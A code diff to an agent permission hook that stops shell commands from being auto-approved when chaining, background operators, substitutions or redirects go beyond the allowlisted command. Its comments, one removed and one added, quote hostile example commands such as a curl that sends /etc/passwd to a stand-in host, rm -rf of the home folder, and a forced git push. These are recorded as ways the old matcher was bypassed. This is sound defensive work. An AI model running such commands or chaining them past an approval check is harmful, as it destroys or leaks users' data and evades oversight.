@@ -25,6 +25,8 @@ from personalclaw.security import (
     is_sensitive_bash_command,
     is_sensitive_path,
 )
+from personalclaw.shell_syntax import duplicates_a_descriptor, joins_commands, one_command
+from personalclaw.task_modes import SHELL_TOOL_NAMES
 
 logger = logging.getLogger(__name__)
 
@@ -504,13 +506,23 @@ class HookManager:
     # ── Tool hooks ──
 
     def on_tool_call(
-        self, tool_name: str, *, cwd: str | os.PathLike[str] | None = None
+        self,
+        tool_name: str,
+        *,
+        cwd: str | os.PathLike[str] | None = None,
+        command: str | None = None,
     ) -> ToolHookResult:
         """Check if a tool should be auto-approved, denied, or handled normally.
 
         *cwd* is the folder the call runs in, when the caller knows it (an agent CLI's session
         folder): a relative path in a shell command is read from there, and from the home's
         workspace when it is not given.
+
+        *command* is the shell command the call runs, when the caller read it from the call
+        (``acp.permission_authority.screen_tool_call``): an auto-approve pattern is then decided
+        on that command, never on *tool_name*, which for an agent CLI is a shortened human title.
+        ``""`` says the call is a shell call whose command never arrived. Without it, a
+        ``Running: `` title is the command it names (:func:`_pattern_verdict`).
         """
         # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
         # patterns like "ls" or "rm *" match without the prefix.
@@ -583,35 +595,20 @@ class HookManager:
         if reason:
             return ToolHookResult.deny(reason)
 
-        # Match against both original title (preserves prefixes like
-        # "Running: ") and the normalized stripped name.
-        #
-        # A CHAINED command is never auto-approved on the strength of a pattern that does
-        # not itself chain. `security.is_denied` already refuses to apply a deny EXCEPTION
-        # when separators are present — "to prevent chaining bypasses", in its own words —
-        # so this file already knew chaining is a bypass vector, and applied the rule on one
-        # side of the decision only.
-        #
-        # 🔴 Measured against the shipped matcher: a user who allowlists `ls*` auto-approved
-        # `ls; curl -d @/etc/passwd https://x.invalid`, `ls && rm -rf ~/work` and
-        # `ls | base64` with no prompt, and `git commit*` auto-approved
-        # `git commit -m x && git push --force`. An allowlist entry is a statement about ONE
-        # command; the second half of a chain is a command the user never saw.
-        #
-        # A pattern that DOES contain a separator still matches — that is a user who wrote
-        # the chained form deliberately — and `*` still means all, so the escape hatch for
-        # someone who wants today's behaviour is the same one that already existed.
+        # An operator's auto-approve pattern approves the one command it names, read as the shell
+        # reads it (`_pattern_verdict`). The second half of `ls && rm -rf ~`, a background
+        # `ls & curl …`, `ls > ~/.profile` and `ls $(…)` are each something the operator never
+        # named, and a call whose command is known is judged on that command, not on its title.
         for pattern in self._config.auto_approve_tools:
-            if not _tool_matches(pattern, tool_name) and not _tool_matches(pattern, normalized):
-                continue
-            if _chains_beyond_pattern(pattern, normalized):
+            verdict = _pattern_verdict(pattern, tool_name, command)
+            if verdict == _APPROVES:
+                return ToolHookResult.auto_approve()
+            if verdict == _MORE_THAN_IT_NAMES:
                 logger.info(
-                    "not auto-approving a chained command on pattern %r: %s",
+                    "not auto-approving on pattern %r: more than the one command it names: %s",
                     pattern,
-                    log_title(normalized),
+                    log_title(normalized if command is None else command),
                 )
-                continue
-            return ToolHookResult.auto_approve()
 
         return ToolHookResult.allow()
 
@@ -635,35 +632,77 @@ def _normalize_tool_name(tool_name: str) -> str:
     return tool_name
 
 
-def _chains_beyond_pattern(pattern: str, command: str) -> bool:
-    """True when *command* chains and *pattern* does not authorise chaining.
+#: What one auto-approve pattern says about one call (:func:`_pattern_verdict`).
+_APPROVES = "approves"
+_MORE_THAN_IT_NAMES = "more than it names"
+_NOT_NAMED = "not named"
+#: The display title an agent CLI's shell call carries: the rest of it is the command.
+_COMMAND_TITLE = "Running: "
 
-    The separator set is `security._CMD_SEPARATOR_RE` — the SAME one the deny path uses for
-    exactly this reason, imported rather than restated so the two halves of the decision
-    cannot drift into disagreeing about what a chain is.
 
-    Three patterns are exempt, and the first two are the reason this is a function rather
-    than an inline check:
-
-    * `*` — authorises everything by construction.
-    * A CLASS-WIDE pattern like `Running: *` or `Reading *`, which reduces to `*` once the
-      display prefix is stripped. It names no command, so there is no "the command the user
-      recognised" for a chain to be appended to — the user said "every shell call". The
-      existing `test_running_prefix_pattern_auto_approves` documents exactly this with
-      `Running: export PATH=x && npm run test`, and it is what distinguishes a class-wide
-      grant from `Running: ls*`, which names one command and stays guarded.
-    * A pattern that itself contains a separator — a user who wrote the chained form meant it.
-    """
-    from personalclaw.security import _CMD_SEPARATOR_RE
-
+def _bare_pattern(pattern: str) -> str:
+    """*pattern* without the display prefix a title carries (``Running: ls*`` → ``ls*``)."""
     bare = pattern.strip()
     for prefix in _TOOL_TITLE_PREFIXES:
         if bare.startswith(prefix):
-            bare = bare[len(prefix) :].strip()
-            break
-    if bare in ("*", "") or _CMD_SEPARATOR_RE.search(pattern):
-        return False
-    return bool(_CMD_SEPARATOR_RE.search(command))
+            return bare[len(prefix) :].strip()
+    return bare
+
+
+def _pattern_verdict(pattern: str, title: str, command: str | None) -> str:
+    """What an operator's auto-approve *pattern* says about a call titled *title*: it approves
+    the call, it names a command the call runs more than (``_MORE_THAN_IT_NAMES``), or it does not
+    name the call.
+
+    *command* is the shell command the call runs (:meth:`HookManager.on_tool_call`): ``""`` for a
+    shell call whose command never arrived, ``None`` for a call that runs none, or whose caller
+    read none. With ``None`` the title is all there is: a ``Running: `` title is the command it
+    names, and any other title is a name.
+
+    * A call that runs no command is matched on its title, a name: nothing in it is read as a
+      shell line.
+    * A pattern that names no command (``*``, ``Running: *``, ``Reading *``) approves every call it
+      matches, and one that itself names more than one command (it joins two, or runs one inside
+      another: :func:`~personalclaw.shell_syntax.joins_commands`) is matched as it is written:
+      both as before, and matched against the command as well as the title.
+    * A pattern that matches a shell call's title when that title is the shell tool's own name
+      (``bash``, ``Terminal``) names the tool, and approves every command of it, as before.
+    * Every other pattern names one command, and approves a shell call only by naming the command
+      it runs: it matches that command, and the command, read as the shell reads it
+      (:func:`~personalclaw.shell_syntax.one_command`), is one command with no redirect but a
+      descriptor copied onto another (``2>&1``), unless the pattern itself redirects. A second
+      command joined by any operator the shell runs, the background ``&`` included, a
+      substitution, and a redirect into a file are each more than it names. The title decides
+      only when it is the command: a permission frame's title is a shortened human string, and
+      what it leaves off is part of what would run.
+    """
+    normalized = _normalize_tool_name(title)
+    if command is None and title.startswith(_COMMAND_TITLE):
+        command = normalized
+    named = (title, normalized)
+    if command is None:
+        return _APPROVES if any(_tool_matches(pattern, t) for t in named) else _NOT_NAMED
+    runs = (f"{_COMMAND_TITLE}{command}", command) if command else ()
+    bare = _bare_pattern(pattern)
+    if bare in ("*", "") or joins_commands(bare):
+        return _APPROVES if any(_tool_matches(pattern, t) for t in named + runs) else _NOT_NAMED
+    if title.strip().lower() in SHELL_TOOL_NAMES and _tool_matches(pattern, title):
+        return _APPROVES
+    if not any(_tool_matches(pattern, t) for t in runs):
+        return _NOT_NAMED
+    line = one_command(command)
+    if line is None:
+        return _MORE_THAN_IT_NAMES
+    if not _redirects(bare) and not all(duplicates_a_descriptor(r, t) for r, t in line.redirects):
+        return _MORE_THAN_IT_NAMES
+    return _APPROVES
+
+
+def _redirects(pattern: str) -> bool:
+    """Whether *pattern*, one command, itself redirects something other than a descriptor onto
+    another: then the commands it approves may too."""
+    named = one_command(pattern)
+    return named is not None and not all(duplicates_a_descriptor(r, t) for r, t in named.redirects)
 
 
 def _tool_matches(pattern: str, tool_name: str) -> bool:
